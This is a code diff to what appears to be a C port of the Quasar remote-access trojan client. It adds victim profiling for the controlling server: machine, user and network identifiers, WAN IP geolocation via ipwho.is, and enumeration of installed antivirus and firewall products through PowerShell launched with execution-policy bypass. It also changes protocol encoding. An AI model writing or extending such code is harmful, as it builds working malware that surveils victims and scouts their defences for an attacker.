@@ -3,6 +3,15 @@
  * Protobuf wire encoding/decoding for Quasar protocol messages.
  * Wire format: tag (varint) then for length-delimited: length (varint) then bytes.
  */
+
+/* GetAdaptersAddresses / IP_ADAPTER_ADDRESSES require a minimum Windows version. */
+#ifndef WINVER
+#define WINVER 0x0600
+#endif
+#ifndef _WIN32_WINNT
+#define _WIN32_WINNT 0x0600
+#endif
+
 #include "pch.h"
 #include "remote_protocol.h"
 #include "remote_passwords.h"
@@ -10,6 +19,7 @@
 #include <ShlObj.h>
 #include <TlHelp32.h>
 #include <iphlpapi.h>
+#include <netioapi.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <stdio.h>
@@ -113,13 +123,14 @@ unsigned int remote_proto_encode_identification(const remote_identification_t* i
     if (id->account_type && id->account_type[0]) { n = put_string(out + pos, out_size - pos, 3, id->account_type); if (!n) return 0; pos += n; }
     if (id->country && id->country[0]) { n = put_string(out + pos, out_size - pos, 4, id->country); if (!n) return 0; pos += n; }
     if (id->country_code && id->country_code[0]) { n = put_string(out + pos, out_size - pos, 5, id->country_code); if (!n) return 0; pos += n; }
-    /* field 6: ImageIndex (varint). Encode as single-byte varint for 0..127 to avoid int32 overflow on decode. */
+    /* field 6: ImageIndex (varint). Encode as normal varint so values like 247 work. */
     if (out_size - pos < 4) return 0;
     out[pos++] = (unsigned char)TAG(6, WIRE_VARINT);
     {
         int v = id->image_index;
-        if (v < 0 || v > 127) v = 0;
-        out[pos++] = (unsigned char)v;
+        if (v < 0) v = 0;
+        unsigned int n2 = put_varint((unsigned int)v, out + pos);
+        pos += n2;
     }
     if (id->id && id->id[0]) { n = put_string(out + pos, out_size - pos, 7, id->id); if (!n) return 0; pos += n; }
     if (id->username && id->username[0]) { n = put_string(out + pos, out_size - pos, 8, id->username); if (!n) return 0; pos += n; }
@@ -261,30 +272,384 @@ unsigned int remote_proto_encode_get_drives_response(unsigned char* out, unsigne
     return pos;
 }
 
+static int append_system_tuple(unsigned char* out, unsigned int out_size, unsigned int* pos,
+    const char* key, const char* value)
+{
+    if (!out || !pos || !key || !value) return 0;
+    if (value[0] == '\0') value = "Unknown";
+
+    unsigned char tuple_buf[512];
+    unsigned int tuple_pos = 0;
+
+    unsigned int n = put_string(tuple_buf + tuple_pos, sizeof(tuple_buf) - tuple_pos, 1, key);
+    if (!n) return 0;
+    tuple_pos += n;
+
+    n = put_string(tuple_buf + tuple_pos, sizeof(tuple_buf) - tuple_pos, 2, value);
+    if (!n) return 0;
+    tuple_pos += n;
+
+    /* field 1 (tag 1, wire len) + varint(len(tuple)) + tuple bytes */
+    if (*pos + 1 + 5 + tuple_pos > out_size) return 0;
+    out[(*pos)++] = (unsigned char)TAG(1, WIRE_LEN);
+    *pos += put_varint(tuple_pos, out + *pos);
+    if (*pos + tuple_pos > out_size) return 0;
+    memcpy(out + *pos, tuple_buf, tuple_pos);
+    *pos += tuple_pos;
+    return 1;
+}
+
+static int extract_json_string(const char* src, const char* key, char* dst, size_t dst_sz)
+{
+    if (!src || !key || !dst || dst_sz < 3) return 0;
+    dst[0] = '\0';
+
+    char pat[96];
+    _snprintf_s(pat, sizeof(pat), _TRUNCATE, "\"%s\"", key);
+
+    const char* p = strstr(src, pat);
+    if (!p) return 0;
+    p = strchr(p, ':');
+    if (!p) return 0;
+    p++;
+    while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
+    if (*p != '\"') return 0;
+    p++;
+
+    size_t i = 0;
+    while (*p && *p != '\"' && i + 1 < dst_sz) {
+        if (*p == '\\' && p[1]) {
+            p++;
+            dst[i++] = *p++;
+            continue;
+        }
+        dst[i++] = *p++;
+    }
+    dst[i] = '\0';
+    return i > 0;
+}
+
+static int extract_json_number_as_string(const char* src, const char* key, char* dst, size_t dst_sz)
+{
+    if (!src || !key || !dst || dst_sz < 2) return 0;
+    dst[0] = '\0';
+
+    char pat[96];
+    _snprintf_s(pat, sizeof(pat), _TRUNCATE, "\"%s\"", key);
+
+    const char* p = strstr(src, pat);
+    if (!p) return 0;
+    p = strchr(p, ':');
+    if (!p) return 0;
+    p++;
+    while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
+
+    int neg = 0;
+    if (*p == '-') { neg = 1; p++; }
+
+    size_t i = 0;
+    if (neg && i + 1 < dst_sz) dst[i++] = '-';
+
+    size_t digits_start = i;
+    while (*p && *p >= '0' && *p <= '9' && i + 1 < dst_sz) {
+        dst[i++] = *p++;
+    }
+    dst[i] = '\0';
+    return i > digits_start;
+}
+
 /* GetSystemInfoResponse: field 1 repeated (Tuple Item1, Item2). Only keys the server does not already show
  * (server AddBasicSystemInformation already shows Operating System and Architecture from client.Value). */
 unsigned int remote_proto_encode_get_system_info_response(unsigned char* out, unsigned int out_size) {
-    if (!out || out_size < 64) return 0;
+    if (!out || out_size < 2048) return 0;
+
     unsigned int pos = 0;
-    const char* keys[] = { "PC Name", "Username" };
-    const char* values[] = { "PC", "User" };
-    unsigned int i;
-    for (i = 0; i < sizeof(keys) / sizeof(keys[0]); i++) {
-        unsigned char tuple_buf[128];
-        unsigned int tuple_pos = 0;
-        unsigned int n = put_string(tuple_buf + tuple_pos, sizeof(tuple_buf) - tuple_pos, 1, keys[i]);
-        if (!n) break;
-        tuple_pos += n;
-        n = put_string(tuple_buf + tuple_pos, sizeof(tuple_buf) - tuple_pos, 2, values[i]);
-        if (!n) break;
-        tuple_pos += n;
-        if (pos + 2 + 5 + tuple_pos > out_size) break;
-        out[pos++] = (unsigned char)TAG(1, WIRE_LEN);
-        pos += put_varint(tuple_pos, out + pos);
-        if (pos + tuple_pos > out_size) break;
-        memcpy(out + pos, tuple_buf, tuple_pos);
-        pos += tuple_pos;
+
+    /* Values with reasonable fallbacks. */
+    char pc_name[256] = { 0 };
+    char username[256] = { 0 };
+    char domain_name[256] = { 0 };
+    char host_name[256] = { 0 };
+    char cpu_name[256] = { 0 };
+    char ram_str[64] = { 0 };
+    char gpu_name[256] = { 0 };
+    char sys_dir[MAX_PATH] = { 0 };
+    char sys_drive[8] = { 0 };
+    char uptime_str[64] = { 0 };
+    char mac_addr[32] = { 0 };
+    char lan_ip[64] = { 0 };
+    char wan_ip[64] = { 0 };
+    char country[128] = { 0 };
+    char tz_utc[64] = { 0 };
+    char asn[64] = { 0 };
+    char isp[128] = { 0 };
+    char antivirus[512] = { 0 };
+    char firewall[512] = { 0 };
+
+    /* PC name */
+    DWORD pc_name_len = (DWORD)sizeof(pc_name);
+    if (!GetComputerNameA(pc_name, &pc_name_len) || pc_name[0] == '\0')
+        strcpy_s(pc_name, sizeof(pc_name), "Unknown");
+
+    /* Username */
+    DWORD username_len = (DWORD)sizeof(username);
+    if (!GetUserNameA(username, &username_len) || username[0] == '\0')
+        strcpy_s(username, sizeof(username), "Unknown");
+
+    /* Domain/host */
+    DWORD domain_len = (DWORD)sizeof(domain_name);
+    if (!GetComputerNameExA(ComputerNamePhysicalDnsDomain, domain_name, &domain_len) || domain_name[0] == '\0')
+        strcpy_s(domain_name, sizeof(domain_name), "-");
+    DWORD host_len = (DWORD)sizeof(host_name);
+    if (!GetComputerNameExA(ComputerNamePhysicalDnsHostname, host_name, &host_len) || host_name[0] == '\0')
+        strcpy_s(host_name, sizeof(host_name), "-");
+
+    /* CPU name from registry */
+    {
+        HKEY hKey = NULL;
+        const char* subkey = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &hKey) == ERROR_SUCCESS && hKey) {
+            DWORD type = 0;
+            char buf[256] = { 0 };
+            DWORD bufSize = (DWORD)sizeof(buf);
+            if (RegQueryValueExA(hKey, "ProcessorNameString", NULL, &type, (LPBYTE)buf, &bufSize) == ERROR_SUCCESS &&
+                buf[0] != '\0') {
+                strcpy_s(cpu_name, sizeof(cpu_name), buf);
+            }
+            RegCloseKey(hKey);
+        }
     }
+    if (cpu_name[0] == '\0') strcpy_s(cpu_name, sizeof(cpu_name), "Unknown");
+
+    /* RAM */
+    {
+        MEMORYSTATUSEX ms;
+        ZeroMemory(&ms, sizeof(ms));
+        ms.dwLength = sizeof(ms);
+        if (GlobalMemoryStatusEx(&ms)) {
+            unsigned long long total_mb = (unsigned long long)(ms.ullTotalPhys / (1024ull * 1024ull));
+            _snprintf_s(ram_str, sizeof(ram_str), _TRUNCATE, "%llu MB", total_mb);
+        }
+    }
+    if (ram_str[0] == '\0') strcpy_s(ram_str, sizeof(ram_str), "Unknown");
+
+    /* GPU name */
+    {
+        DISPLAY_DEVICEA dd;
+        ZeroMemory(&dd, sizeof(dd));
+        dd.cb = sizeof(dd);
+        for (DWORD i = 0; ; i++) {
+            ZeroMemory(&dd, sizeof(dd));
+            dd.cb = sizeof(dd);
+            if (!EnumDisplayDevicesA(NULL, i, &dd, 0)) break;
+            if (dd.DeviceString[0] == '\0') continue;
+            if (strstr(dd.DeviceString, "Microsoft Basic Display Adapter") != NULL) continue;
+            strcpy_s(gpu_name, sizeof(gpu_name), dd.DeviceString);
+            break;
+        }
+    }
+    if (gpu_name[0] == '\0') strcpy_s(gpu_name, sizeof(gpu_name), "Unknown");
+
+    /* System dir */
+    if (GetSystemDirectoryA(sys_dir, sizeof(sys_dir)) == 0 || sys_dir[0] == '\0')
+        strcpy_s(sys_dir, sizeof(sys_dir), "Unknown");
+    if (sys_dir[0] && sys_dir[1] == ':')
+        _snprintf_s(sys_drive, sizeof(sys_drive), _TRUNCATE, "%c:\\", sys_dir[0]);
+    else
+        strcpy_s(sys_drive, sizeof(sys_drive), "Unknown");
+
+    /* Uptime */
+    {
+        ULONGLONG ms = GetTickCount64();
+        ULONGLONG sec = ms / 1000ull;
+        unsigned long long days = sec / (24ull * 3600ull);
+        sec %= (24ull * 3600ull);
+        unsigned long long hours = sec / 3600ull;
+        sec %= 3600ull;
+        unsigned long long mins = sec / 60ull;
+        unsigned long long secs = sec % 60ull;
+        _snprintf_s(uptime_str, sizeof(uptime_str), _TRUNCATE, "%llud : %lluh : %llum : %llus",
+            days, hours, mins, secs);
+    }
+
+    /* MAC + LAN IPv4
+     * Use GetAdaptersInfo (older, widely available) to avoid SDK/type issues with IP_ADAPTER_ADDRESSES. */
+    {
+        IP_ADAPTER_INFO* adapterInfo = NULL;
+        ULONG outBufLen = 0;
+        DWORD ret = GetAdaptersInfo(adapterInfo, &outBufLen);
+        if (ret == ERROR_BUFFER_OVERFLOW && outBufLen > 0) {
+            adapterInfo = (IP_ADAPTER_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, outBufLen);
+            if (adapterInfo) {
+                ret = GetAdaptersInfo(adapterInfo, &outBufLen);
+                if (ret == NO_ERROR) {
+                    IP_ADAPTER_INFO* cur = adapterInfo;
+                    for (; cur != NULL; cur = cur->Next) {
+                        if (mac_addr[0] == '\0' && cur->AddressLength >= 6) {
+                            _snprintf_s(mac_addr, sizeof(mac_addr), _TRUNCATE,
+                                "%02X:%02X:%02X:%02X:%02X:%02X",
+                                cur->Address[0], cur->Address[1], cur->Address[2],
+                                cur->Address[3], cur->Address[4], cur->Address[5]);
+                        }
+
+                        if (lan_ip[0] == '\0') {
+                            IP_ADDR_STRING* ipList = &cur->IpAddressList;
+                            while (ipList != NULL) {
+                                if (ipList->IpAddress.String[0] != '\0') {
+                                    if (strncmp(ipList->IpAddress.String, "127.", 4) != 0 &&
+                                        strcmp(ipList->IpAddress.String, "0.0.0.0") != 0) {
+                                        strncpy_s(lan_ip, sizeof(lan_ip), ipList->IpAddress.String, _TRUNCATE);
+                                        break;
+                                    }
+                                }
+                                ipList = ipList->Next;
+                            }
+                        }
+
+                        if (mac_addr[0] != '\0' && lan_ip[0] != '\0') break;
+                    }
+                }
+            }
+        }
+        if (adapterInfo) HeapFree(GetProcessHeap(), 0, adapterInfo);
+    }
+    if (mac_addr[0] == '\0') strcpy_s(mac_addr, sizeof(mac_addr), "Unknown");
+    if (lan_ip[0] == '\0') strcpy_s(lan_ip, sizeof(lan_ip), "Unknown");
+
+    /* Antivirus + Firewall (match C# client behavior)
+     * C# uses WMI: AntivirusProduct / FirewallProduct in SecurityCenter2 (fallback SecurityCenter).
+     * Here we run PowerShell Get-CimInstance and join displayName with "; ". */
+    {
+        antivirus[0] = '\0';
+        firewall[0] = '\0';
+
+        char cmd[2048];
+        _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
+            "cmd /c powershell -NoProfile -ExecutionPolicy Bypass -Command \"$ErrorActionPreference='SilentlyContinue'; "
+            "$av=(Get-CimInstance -Namespace 'root\\SecurityCenter2' -ClassName AntivirusProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName) -join '; '; "
+            "if([string]::IsNullOrEmpty($av)) { $av=(Get-CimInstance -Namespace 'root\\SecurityCenter' -ClassName AntivirusProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName) -join '; ' }; "
+            "$fw=(Get-CimInstance -Namespace 'root\\SecurityCenter2' -ClassName FirewallProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName) -join '; '; "
+            "if([string]::IsNullOrEmpty($fw)) { $fw=(Get-CimInstance -Namespace 'root\\SecurityCenter' -ClassName FirewallProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName) -join '; ' }; "
+            "if([string]::IsNullOrEmpty($av)){$av='N/A'}; if([string]::IsNullOrEmpty($fw)){$fw='N/A'}; "
+            "$av+'|||'+$fw\"");
+
+        FILE* fp = _popen(cmd, "rt");
+        char outbuf[1024];
+        size_t total = 0;
+        outbuf[0] = '\0';
+        if (fp) {
+            while (total < sizeof(outbuf) - 1) {
+                if (fgets(outbuf + total, (int)(sizeof(outbuf) - 1 - total), fp) == NULL) break;
+                total = strlen(outbuf);
+            }
+            _pclose(fp);
+        }
+
+        /* Trim possible newlines at end */
+        for (size_t i = 0; outbuf[i] != '\0'; i++) {
+            if (outbuf[i] == '\r' || outbuf[i] == '\n') { outbuf[i] = '\0'; break; }
+        }
+
+        const char* delim = strstr(outbuf, "|||");
+        if (delim) {
+            size_t av_len = (size_t)(delim - outbuf);
+            size_t fw_len = strlen(delim + 3);
+            if (av_len >= 1 && av_len < sizeof(antivirus)) {
+                memcpy(antivirus, outbuf, av_len);
+                antivirus[av_len] = '\0';
+            }
+            if (fw_len >= 1 && fw_len < sizeof(firewall)) {
+                memcpy(firewall, delim + 3, fw_len);
+                firewall[fw_len] = '\0';
+            }
+        }
+
+        if (antivirus[0] == '\0') strcpy_s(antivirus, sizeof(antivirus), "Unknown");
+        if (firewall[0] == '\0') strcpy_s(firewall, sizeof(firewall), "Unknown");
+    }
+
+    /* Geo/IP (ipwho.is via PowerShell + string scanning, cached) */
+    {
+        static ULONGLONG s_last_geo_ms = 0;
+        static char s_wan_ip[64] = { 0 };
+        static char s_country[128] = { 0 };
+        static char s_tz_utc[64] = { 0 };
+        static char s_asn[64] = { 0 };
+        static char s_isp[128] = { 0 };
+
+        if (s_last_geo_ms == 0 || (GetTickCount64() - s_last_geo_ms) > (12ull * 60ull * 60ull * 1000ull)) {
+            char cmd[2048];
+            _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
+                "cmd /c powershell -NoProfile -ExecutionPolicy Bypass -Command \"(Invoke-WebRequest -Uri 'https://ipwho.is/' -UseBasicParsing).Content\"");
+
+            FILE* fp = _popen(cmd, "rt");
+            char json[8192];
+            size_t total = 0;
+            json[0] = '\0';
+            if (fp) {
+                while (total < sizeof(json) - 1) {
+                    if (fgets(json + total, (int)(sizeof(json) - 1 - total), fp) == NULL) break;
+                    total = strlen(json);
+                }
+                _pclose(fp);
+            }
+
+            if (json[0] != '\0') {
+                (void)extract_json_string(json, "ip", wan_ip, sizeof(wan_ip));
+                (void)extract_json_string(json, "country", country, sizeof(country));
+
+                const char* tz_section = strstr(json, "\"timezone\"");
+                if (tz_section) (void)extract_json_string(tz_section, "utc", tz_utc, sizeof(tz_utc));
+
+                const char* conn_section = strstr(json, "\"connection\"");
+                if (conn_section) {
+                    (void)extract_json_number_as_string(conn_section, "asn", asn, sizeof(asn));
+                    (void)extract_json_string(conn_section, "isp", isp, sizeof(isp));
+                }
+            }
+
+            if (wan_ip[0] == '\0') strcpy_s(wan_ip, sizeof(wan_ip), "Unknown");
+            if (country[0] == '\0') strcpy_s(country, sizeof(country), "Unknown");
+            if (tz_utc[0] == '\0') strcpy_s(tz_utc, sizeof(tz_utc), "Unknown");
+            if (asn[0] == '\0') strcpy_s(asn, sizeof(asn), "Unknown");
+            if (isp[0] == '\0') strcpy_s(isp, sizeof(isp), "Unknown");
+
+            strcpy_s(s_wan_ip, sizeof(s_wan_ip), wan_ip);
+            strcpy_s(s_country, sizeof(s_country), country);
+            strcpy_s(s_tz_utc, sizeof(s_tz_utc), tz_utc);
+            strcpy_s(s_asn, sizeof(s_asn), asn);
+            strcpy_s(s_isp, sizeof(s_isp), isp);
+            s_last_geo_ms = GetTickCount64();
+        } else {
+            strcpy_s(wan_ip, sizeof(wan_ip), s_wan_ip[0] ? s_wan_ip : "Unknown");
+            strcpy_s(country, sizeof(country), s_country[0] ? s_country : "Unknown");
+            strcpy_s(tz_utc, sizeof(tz_utc), s_tz_utc[0] ? s_tz_utc : "Unknown");
+            strcpy_s(asn, sizeof(asn), s_asn[0] ? s_asn : "Unknown");
+            strcpy_s(isp, sizeof(isp), s_isp[0] ? s_isp : "Unknown");
+        }
+    }
+
+    /* Emit tuples in the same order as the original C# client. */
+    (void)append_system_tuple(out, out_size, &pos, "Processor (CPU)", cpu_name);
+    (void)append_system_tuple(out, out_size, &pos, "Memory (RAM)", ram_str);
+    (void)append_system_tuple(out, out_size, &pos, "Video Card (GPU)", gpu_name);
+    (void)append_system_tuple(out, out_size, &pos, "Username", username);
+    (void)append_system_tuple(out, out_size, &pos, "PC Name", pc_name);
+    (void)append_system_tuple(out, out_size, &pos, "Domain Name", domain_name);
+    (void)append_system_tuple(out, out_size, &pos, "Host Name", host_name);
+    (void)append_system_tuple(out, out_size, &pos, "System Drive", sys_drive);
+    (void)append_system_tuple(out, out_size, &pos, "System Directory", sys_dir);
+    (void)append_system_tuple(out, out_size, &pos, "Uptime", uptime_str);
+    (void)append_system_tuple(out, out_size, &pos, "MAC Address", mac_addr);
+    (void)append_system_tuple(out, out_size, &pos, "LAN IP Address", lan_ip);
+    (void)append_system_tuple(out, out_size, &pos, "WAN IP Address", wan_ip);
+    (void)append_system_tuple(out, out_size, &pos, "ASN", asn);
+    (void)append_system_tuple(out, out_size, &pos, "ISP", isp);
+    (void)append_system_tuple(out, out_size, &pos, "Antivirus", antivirus);
+    (void)append_system_tuple(out, out_size, &pos, "Firewall", firewall);
+    (void)append_system_tuple(out, out_size, &pos, "Time Zone", tz_utc);
+    (void)append_system_tuple(out, out_size, &pos, "Country", country);
+
     return pos;
 }
 
